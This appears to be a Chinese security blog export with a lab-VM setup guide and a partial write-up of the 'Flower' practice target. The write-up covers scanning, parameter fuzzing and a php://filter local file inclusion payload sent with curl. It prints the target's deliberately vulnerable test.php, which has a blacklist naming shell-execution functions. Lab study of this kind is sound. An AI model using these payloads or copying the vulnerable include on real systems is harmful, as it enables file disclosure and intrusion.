<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>qemu</span><br></pre></td></tr></table></figure></div>
<p>然后在靶场解压后的目录中执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">qemu-<span class="selector-tag">img</span> convert -<span class="selector-tag">p</span>  -O qcow2 Deathnote-disk001<span class="selector-class">.vmdk</span> Deathnote<span class="selector-class">.qcow2</span> </span><br></pre></td></tr></table></figure></div>
<p>执行后把.vmdk 文件转换成.qcow2文件</p>
<h2 id="utm设置"><a href="#utm设置" class="headerlink" title="utm设置"></a>utm设置</h2><p>点击创建虚拟机 –&gt;  模拟  –&gt; 其他 进入虚拟机配置<br><img src="https://pic1.imgdb.cn/item/679a4c5ed0e0a243d4f87b68.png"><br>启动设备选择无<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b69.png"><br>修改内存  一般虚拟只要分配1g以下的内存<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b6a.png"><br>然后可以给虚拟机起个名字 点击存储<br><img src="https://pic1.imgdb.cn/item/679a4c60d0e0a243d4f87b6b.png"><br>接着右击虚拟机,点击编辑，进入虚拟机设置<br>1.在QEMU中取消UEFI启动<br><img src="https://pic1.imgdb.cn/item/679a4c98d0e0a243d4f87b6e.png"><br>2.网络选择桥接(你可以自己配置网络，桥接是最简单的)<br><img src="https://pic1.imgdb.cn/item/679a4c9ad0e0a243d4f87b6f.png"><br>3.右击IDE驱动器,删除<br><img src="https://pic1.imgdb.cn/item/679a4c9bd0e0a243d4f87b70.png"><br>4.驱动器新建点击导入 ，选择我们刚刚转换的.qcow2文件</p>
<p>接着就可以启动虚拟机了<br>启动成功的画面:<br><img src="https://pic1.imgdb.cn/item/679a4de8d0e0a243d4f87ba6.png"></p>
<h2 id="靶机没有分配到ip解决方案"><a href="#靶机没有分配到ip解决方案" class="headerlink" title="靶机没有分配到ip解决方案"></a>靶机没有分配到ip解决方案</h2><p>靶机启动后  nmap扫描当前网段发现主机ip 但是有的靶机没有分配到靶机<br>这是由于靶机中的使用的网卡和其配置文件中的网卡不匹配导致的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">29</span> <span class="number">23</span>:<span class="number">50</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.0049</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">3</span> hosts <span class="keyword">up</span>) scanned in <span class="number">2.41</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>比如我这里这三个ip都不是靶机</p>
<h3 id="版本1"><a href="#版本1" class="headerlink" title="版本1"></a>版本1</h3><p>这时 先关闭靶机 在启动的蓝色界面 按e进入命令行模式<br>（如果一直没有出现这个蓝色界面说明不是debian系的，在启动的时候按shift也能进入这个界面）<br>光标下移  找到ro（这里的倒数第三行） 改成rw single init&#x3D;&#x2F;bin&#x2F;bash<br>ctrl + x 进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679a51aad0e0a243d4f87be5.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be6.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be7.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">ip <span class="keyword">a</span> <span class="comment">#查看实际使用网卡 (我这里就是enp0s1)</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be8.png"><br>然后输入 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LEAF"><figure class="iseeu highlight /leaf"><table><tr><td class="code"><pre><span class="line">nano /etc/network/interfaces <span class="punctuation">#</span><span class="params">(编辑网卡)</span></span><br></pre></td></tr></table></figure></div>
<p>这里用nano 不用vim  vim不知道为什么在这个模式下面更改不了内容<br>然后把网卡替换成实际的网卡(enp0s3 改成 enp0s1)<br><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be9.png"><br><img src="https://pic1.imgdb.cn/item/679a5210d0e0a243d4f87bf1.png"><br>ctrl + o 保存 回车确定 最后ctrl + x 退出<br>重启网络服务</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service networking restart</span></span><br></pre></td></tr></table></figure></div>
<p>等加载之后重启虚拟机  就发现可以扫到ip啦 (如果还是不行可以尝试把utm网络中桥接的端口从自动改成en0)<br><img src="https://pic1.imgdb.cn/item/679a5211d0e0a243d4f87bf2.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">30</span> <span class="number">00</span>:<span class="number">07</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.035</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.135</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.17</span>s latency).</span><br><span class="line">MAC Address: B6:<span class="number">9</span>C:<span class="number">5</span>D:<span class="number">4</span>F:DE:AB (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts <span class="keyword">up</span>) scanned in <span class="number">3.69</span> seconds</span><br></pre></td></tr></table></figure></div>
<h3 id="版本2"><a href="#版本2" class="headerlink" title="版本2"></a>版本2</h3><p>如果开机的时候一直加载进度进度条，没有出现蓝色界面，说明是另一种版本<br>按shift进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679dd3ddd0e0a243d4f972dc.png"><br>然后按e，把ro改成 rw single init&#x3D;&#x2F;bin&#x2F;bash 并且把这行后面的都删除，直到initrd<br><img src="https://pic1.imgdb.cn/item/679dd50ed0e0a243d4f972f2.png"><br>ctrl + x开机<br>和dibian系一样用ip a查看真实ip端口<br>不一样的是这里网卡配置文件在</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/etc/</span>netplan<span class="regexp">/00-installer-config.yaml #有时候不叫这个在/</span>etc/netplan下找就可以了</span><br></pre></td></tr></table></figure></div>
<p>修改成真实网卡（我这里3改成1）<br><img src="https://pic1.imgdb.cn/item/679dd746d0e0a243d4f97313.png"><br>ctrl + o 回车  ctrl + x 退出</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/netplan/00-installer-config.yaml </span><br><span class="line">netplan apply</span><br></pre></td></tr></table></figure></div>
<p>让修改后的文件生效</p>
<p>然后重启靶机 就可以获取到靶机ip了</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>如果这样修改了网卡信息的话，打靶机碰到比如knock这样的服务的话，也要先进入靶机的命令行模式修改knock等的配置，可以参考 <a href="/posts/16384.html" title="HMV-Alzheimer">HMV-Alzheimer</a></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>靶场配置</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>群友靶机Flower</title>
    <url>/posts/62580.html</url>
    <content><![CDATA[<p>群友靶机Flower WP复现</p>
<span id="more"></span>
<p>这个是flower做的靶机，但是里面的知识点基本都是我不知道的，所以我就跟着群主和大佬的wp复现，学到了不少</p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.112.83                          </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">22</span> <span class="number">15</span>:<span class="number">35</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">112.83</span>)</span><br><span class="line">Host is up (<span class="number">0.0020</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u4 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> c2:<span class="number">91</span>:d9:a5:f7:a3:<span class="number">98</span>:<span class="number">1</span>f:c1:<span class="number">4</span>a:<span class="number">70</span>:<span class="number">28</span>:aa:ba:a4:<span class="number">10</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">3</span>e:<span class="number">1</span>f:c9:eb:c0:<span class="number">6</span>f:<span class="number">24</span>:<span class="number">06</span>:fc:<span class="number">52</span>:<span class="number">5</span>f:<span class="number">2</span>f:<span class="number">1</span>b:<span class="number">35</span>:<span class="number">33</span>:ec (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> ec:<span class="number">64</span>:<span class="number">87</span>:<span class="number">04</span>:<span class="number">9</span>a:<span class="number">4</span>b:<span class="number">32</span>:fe:<span class="number">2</span>d:<span class="number">1</span>f:<span class="number">9</span>a:b0:<span class="number">81</span>:d3:<span class="number">7</span>c:cf (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">|<span class="params">_http-title:</span> \xE5\x87\x9B\xE5\x86\xBD\xE6\x99\x82\xE9\x9B\xA8 <span class="operator">-</span> \xE5\x85\xAC\xE5\xBC\x8F\xE3\x82\xA6\xE3\x82\xA7\xE3\x83\x96\xE3\x82\xB5\xE3\x82\xA4\xE3\x83\x88</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">52</span>:<span class="number">2</span>F:A8:AF:<span class="number">31</span>:<span class="number">4</span>A (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.98</span> ms bogon (<span class="number">192.168</span>.<span class="number">112.83</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.73</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>开放22和80端口，直接去web界面看看</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>web是一个这样的界面<br><img src="https://pic1.imgdb.cn/item/67b97e84d0e0a243d401ddbe.png"><br>点击一个按钮进入之后url是<code>http://192.168.112.83/?do=album_3.php</code><br>先扫一下目录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u 192.168.112.83                            </span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.112.83/_25-02-22_15-40-59.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">112.83</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">15</span>:<span class="number">40</span>:<span class="number">59</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span>                                 </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span>                                  </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span>                                   </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.html</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span>                                      </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">21</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">228</span>B  <span class="operator">-</span> <span class="symbol">/README.md</span>                                        </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">24</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">16</span>B  <span class="operator">-</span> <span class="symbol">/test.php</span>                                         </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">24</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">17</span>B  <span class="operator">-</span> <span class="symbol">/tools.php</span>                                        </span><br></pre></td></tr></table></figure></div>
<p>README.md中的内容是：<br>2025年1月22日 本项目的开发暂时到此结束。在2月正式公开项目之前，请务必整理测试部分。——开发团队 阿达西<br>这里说的测试部分，就是test，结果就是在&#x2F;test.php中有后门<br>而且我们直接访问test.php和tools.php是没有内容的，但是它们的大小不是0<br>用wfuzz扫一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hw 1 http://192.168.112.83/test.php?FUZZ=/etc/passwd;</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.112.83/test.php?FUZZ=/etc/passwd</span><br><span class="line">Total requests: 4744</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload                                                                                 </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000001524:   200        1 L      2 W        27 Ch       &quot;do&quot;                                                                                    </span><br><span class="line"></span><br><span class="line">Total time: 8.807905</span><br><span class="line">Processed Requests: 4744</span><br><span class="line">Filtered Requests: 4743</span><br><span class="line">Requests/sec.: 538.6070</span><br></pre></td></tr></table></figure></div>
<p>这个后门就是do，然后我们用php伪协议读一下文件的内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># curl http://192.168.112.83/test.php?do=php://filter/convert.base64-encode/resource=index.php</span></span><br><span class="line">&lt;h1&gt;test&lt;/h1&gt;</span><br><span class="line">PD9waHAKICAgICRhbGJ1bXMgPSBhcnJheSgKICAgICAgICAnYWxidW1fMS5waHAnLAogICAgICAgICdhbGJ1bV8yLnBocCcsCiAgICAgICAgJ2FsYnVtXzMucGhwJywKICAgICAgICAnYWxidW1fNC5waHAnLAogICAgICAgICdhbGJ1bV81LnBocCcsCiAgICAgICAgJ2FsYnVtXzYucGhwJwogICAgKTsKCiAgICBpZihpc3NldCgkX0dFVFsnZG8nXSkgJiYgaW5fYXJyYXkoJF9HRVRbJ2RvJ10sICRhbGJ1bXMpKSB7CiAgICAgICAgaW5jbHVkZSAkX0dFVFsnZG8nXTsgCiAgICB9IGVsc2UgewogICAgICAgIGluY2x1ZGUgJ2hvbWUucGhwJzsKICAgIH0KPz4K</span><br><span class="line"></span><br><span class="line"><span class="comment">#index.php </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$albums</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;album_1.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;album_2.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;album_3.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;album_4.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;album_5.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;album_6.php&#x27;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>], <span class="variable">$albums</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;home.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&#x27;writer&#x27;</span>,<span class="string">&#x27;etc&#x27;</span>,<span class="string">&#x27;temp&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;var&#x27;</span>, <span class="string">&#x27;setting&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;cache&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>, <span class="string">&#x27;download&#x27;</span>, <span class="string">&#x27;include&#x27;</span>, <span class="string">&#x27;require&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;passthru&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;shell_exec&#x27;</span>, <span class="string">&#x27;proc_open&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;pcntl_exec&#x27;</span>, <span class="string">&#x27;phar://&#x27;</span>, <span class="string">&#x27;file://&#x27;</span>, <span class="string">&#x27;zip://&#x27;</span>, <span class="string">&#x27;data://&#x27;</span>, <span class="string">&#x27;glob://&#x27;</span>, <span class="string">&#x27;ftp://&#x27;</span>,<span class="string">&#x27;.log&#x27;</span>);</span><br><span class="line">        <span class="variable">$do</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]);</span><br><span class="line">        <span class="variable">$do</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^A-Za-z0-9\=\.\/\-:]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$do</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$black</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$do</span>, <span class="variable">$black</span>) !== <span class="literal">false</span>||<span class="title function_ invoke__">strpos</span>(<span class="variable">$do</span>, <span class="string">&#x27;../&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;self-hacking!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$do</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>可以看到test.php没有过滤php:&#x2F;&#x2F;但是过滤了data:&#x2F;&#x2F; </p>
